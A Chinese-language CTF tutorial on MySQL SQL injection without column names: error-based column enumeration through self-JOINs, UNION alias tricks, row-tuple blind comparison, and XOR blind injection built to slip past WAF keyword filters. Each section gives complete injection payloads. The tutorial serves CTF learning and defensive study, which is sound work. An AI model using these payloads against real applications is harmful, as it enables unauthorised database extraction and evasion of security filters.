# 👑 无列名注入与异或盲注极值对抗（CTF 高阶死斗）

> **终极困境**：在现代高水平 CTF 赛题中，出题人往往设置了双重绝杀：
> 1. `information_schema` 关键词被 WAF 彻底封死；
> 2. 虽然利用 `sys.schema_table_statistics` 或 `mysql.innodb_table_stats` 找出了数据表名为 `flag`，但**完全不知道存储 Flag 的字段名到底叫什么**（可能是 `fl4g_123` 或 `secret_data`）。
>
> 此时常规的 `SELECT flag FROM ...` 彻底瘫痪，必须使用 **无列名注入（No-Column-Name Injection）** 技术实现盲穿！

---

## 0. 基础前置认知与小白扫盲：连列名都不知道怎么读数据？

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


### 1. 攻防盲区：当 `information_schema` 被彻底拉黑
* 正常的 SQL 注入，大家都会去查 `information_schema.columns` 来获取字段名叫 `password` 还是 `flag`。
* 但在很多高难度 CTF 和硬核防守场景中，WAF 会把 `information_schema` 关键词彻底封死。
* **无列名注入（No-Column-Name Injection）的黑科技**：
  * **黑客的核心哲学**：**“我根本不需要知道你叫什么名字，我只需要知道你排在第几列！”**
  * 在 MySQL 中，你可以利用 `SELECT 1, 2, 3 UNION SELECT * FROM users` 强行构造出一个带有默认别名（`1, 2, 3`）的虚拟临时表，然后直接提取第 2 列或第 3 列的内容，彻底架空对元数据字典的依赖！

## 一、方案一：JOIN 报错递进枚举列名（显错环境首选）

在 MySQL 中，如果对一张表进行自身与自身的笛卡尔积连接（Self-Join），且两张表拥有同名字段，MySQL 会抛出 `Duplicate column name '列名'` 的语法错误！

### 1. 爆出第 1 个未知列名 Payload：
```sql
AND (SELECT * FROM (SELECT * FROM flag a JOIN flag b) c) --+
```
#### 🔍 底层报错与解析：
```text
ERROR 1060 (42S21): Duplicate column name 'id'
```
* **原理解析**：表 `a` 和表 `b` 都是 `flag` 表。两表连接时，由于都包含第一列 `id`，结果集的字段名发生同名冲突，MySQL 在解析阶段直接把冲突的列名 `'id'` 作为报错文本抛出！

---

### 2. 配合 `USING` 爆出第 2 个未知列名 Payload：
知道了第 1 个列名为 `id`，我们使用 `USING(id)` 强行合并该列，消除 `id` 的冲突：
```sql
AND (SELECT * FROM (SELECT * FROM flag a JOIN flag b USING(id)) c) --+
```
#### 🔍 底层报错与解析：
```text
ERROR 1060 (42S21): Duplicate column name 'real_flag_column'
```
* **原理解析**：`USING(id)` 让两表以 `id` 关联合并为一个公共 `id`，此时冲突的接力棒顺延到了第二列！MySQL 再次精准抛出第二列的名字！
* **递归推进**：若还有更多列，只需继续累加：`USING(id, real_flag_column)`，即可一行代码不查系统字典，把全表所有列名剥得精光！

## 二、方案二：虚拟表别名映射法（联合查询无列名直读）

如果目标有数据回显位，我们甚至**根本不需要知道列名**，即可直接将数据提出来！

### 1. 核心数学原理：结果集列名重定义
在 SQL 规范中，`UNION` 操作符产生的复合结果集，**其列名完全取决于第一个 `SELECT` 语句所定义的列别名或常量名**！

执行如下测试：
```sql
SELECT 1, 2, 3 UNION SELECT * FROM flag;
```
其在内存中的虚拟表结构会变成：
| `1` (列名变为字符1) | `2` (列名变为字符2) | `3` (列名变为字符3) |
| :--- | :--- | :--- |
| 1 | 2 | 3 |
| 1 (原flag表id) | flag{this_is_fake} | 2026-10-12 |

由于列名被强行改写为了数字，我们就可以通过反引号直接按序号提取数据！

### 2. 完整无列名脱库 Payload：
```sql
?id=-1' UNION SELECT 1, (SELECT `2` FROM (SELECT 1, 2, 3 UNION SELECT * FROM flag) a LIMIT 1,1), 3 --+
```

#### 🔍 逐层嵌套与关键参数拆解表：
| 表达式 / 参数 | 语法作用与底层机理 | 关键避坑要点 |
| :--- | :--- | :--- |
| `SELECT 1, 2, 3` | 构造基准列头。填充与 `flag` 表列数完全一致的数字常量。 | 列数必须严格匹配 `flag` 表的总字段数。 |
| `UNION SELECT * FROM flag` | 将真实的敏感数据挂载到虚拟表下方。 | 使用 `*` 免去了填写具体列名的烦恼。 |
| `AS a` | 给整个复合子查询赋予临时表别名 `a`。 | SQL 规范硬性要求派生表必须带别名。 |
| `` `2` `` | **核心抓手**：提取虚拟表中第 2 列的数据！ | **反引号绝不可省略！** 如果不加反引号写成 `SELECT 2`，MySQL 会认为你想输出数字常量 `2`，加了反引号 `` `2` `` 才会提取列名为 `"2"` 的字段内容！ |
| `LIMIT 1,1` | 跳过第 0 行的假数据 `1, 2, 3`，精准提取第 1 行真实的 Flag 数据！ | 偏移量定位。 |

## 三、方案三：无列名行级元组逐字符比较盲注（盲注死斗）

如果既没有报错回显，也没有联合查询回显位，只能盲注，如何在**不知道列名**的情况下猜解 Flag？

### 1. MySQL 行级元组（Row Subquery）比较特性
在 MySQL 中，两个行元组可以进行全局字典序大小比较（如同 Python 的元组比对）：
```sql
('flag{a', 1) < ('flag{z', 1)  -- 结果为 1 (真)
```
比对规则是：**从左到右逐个字符比对 ASCII 码**，只要第一位决出胜负，后续直接忽略。

### 2. 无列名逐位爆破 Payload 构造：
假设已知 `flag` 表有 2 个字段，第一列是数字 ID，第二列是字符串 Flag：
```sql
?id=1' AND ((SELECT 1, 'flag{a%') > (SELECT * FROM flag LIMIT 0,1)) --+
```
通过不断调整右侧测试字符串 `'flag{...'` 的每一个字符，配合二分法进行大小比对，**无需列名即可将完整的 Flag 字符逐个推导还原！**

## 四、异或盲注（XOR Blind Injection）极值对抗

当 WAF 将 `AND`、`OR`、`&&`、`||` 全部绞杀，甚至页面在 `id=1` 之外的查询全部返回 404 时，**异或运算符 `^` 是唯一的物理破局点**。

### 1. 异或运算真值表
在 SQL 算术规则中，`^` 为按位异或：
* `1 ^ 1 = 0` (假)
* `1 ^ 0 = 1` (真)
* `0 ^ 0 = 0` (假)

### 2. 构造三元异或状态反转链
```sql
?id=1 ^ (ascii(substr((SELECT flag FROM flag_tbl),1,1))>100) ^ 0
```

#### 🔍 逻辑演算流动图：
* **情况 A（测试条件为真）**：
  `(ascii(...)>100)` 结果为 `1`。
  原式等价于：`1 ^ 1 ^ 0` $\rightarrow$ `0 ^ 0 = 0`。
  后端实际执行：`WHERE id = 0` $\rightarrow$ 页面**无数据/返回假**。
* **情况 B（测试条件为假）**：
  `(ascii(...)>100)` 结果为 `0`。
  原式等价于：`1 ^ 0 ^ 0` $\rightarrow$ `1 ^ 0 = 1`。
  后端实际执行：`WHERE id = 1` $\rightarrow$ 页面**显示正常数据/返回真**。

> **战术总结**：利用异或的翻转特性，把逻辑真假完美投射到“正常数据页面”与“空数据页面”的转换中。**Payload 中完全不需要出现任何逻辑连词，天然规避绝大多数语义型 WAF！**
